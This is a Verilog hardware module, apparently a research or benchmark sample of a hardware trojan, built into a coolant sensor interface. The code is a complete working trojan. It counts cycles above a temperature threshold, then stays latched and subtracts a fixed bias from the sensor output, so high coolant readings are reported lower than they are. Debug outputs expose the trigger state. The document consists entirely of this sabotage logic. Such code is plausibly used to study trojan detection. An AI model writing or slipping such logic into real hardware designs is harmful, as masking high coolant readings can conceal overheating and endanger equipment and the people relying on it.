`timescale 1ns/1ps

module coolant_sensor_interface_trojan #(
    parameter integer DATA_WIDTH = 16,
    parameter signed [DATA_WIDTH-1:0] TRIGGER_THRESHOLD = 16'sd950,
    parameter [15:0] TRIGGER_CYCLES = 16'd8,
    parameter signed [DATA_WIDTH-1:0] PAYLOAD_BIAS = 16'sd80
) (
    input  wire                         clk,
    input  wire                         reset_n,
    input  wire signed [DATA_WIDTH-1:0] sensor_in,
    output reg  signed [DATA_WIDTH-1:0] sensor_out,
    output reg                          trojan_triggered,
    output reg                          payload_active,
    output reg  [15:0]                  trigger_counter,
    output reg  signed [DATA_WIDTH-1:0] clean_sensor_value,
    output reg  signed [DATA_WIDTH-1:0] trojan_sensor_value
);
    wire threshold_met;
    wire trigger_now;
    wire signed [DATA_WIDTH-1:0] masked_sensor_value;

    assign threshold_met = sensor_in >= TRIGGER_THRESHOLD;
    assign trigger_now =
        threshold_met &&
        !payload_active &&
        (trigger_counter >= (TRIGGER_CYCLES - 1'b1));
    assign masked_sensor_value = sensor_in - PAYLOAD_BIAS;

    always @(posedge clk or negedge reset_n) begin
        if (!reset_n) begin
            sensor_out          <= {DATA_WIDTH{1'b0}};
            trojan_triggered    <= 1'b0;
            payload_active      <= 1'b0;
            trigger_counter     <= 16'd0;
            clean_sensor_value  <= {DATA_WIDTH{1'b0}};
            trojan_sensor_value <= {DATA_WIDTH{1'b0}};
        end else begin
            clean_sensor_value <= sensor_in;

            if (!payload_active) begin
                if (threshold_met) begin
                    if (trigger_counter < TRIGGER_CYCLES)
                        trigger_counter <= trigger_counter + 1'b1;
                end else begin
                    trigger_counter <= 16'd0;
                end
            end

            if (trigger_now) begin
                trojan_triggered <= 1'b1;
                payload_active   <= 1'b1;
            end

            if (payload_active || trigger_now) begin
                sensor_out          <= masked_sensor_value;
                trojan_sensor_value <= masked_sensor_value;
            end else begin
                sensor_out          <= sensor_in;
                trojan_sensor_value <= sensor_in;
            end
        end
    end
endmodule
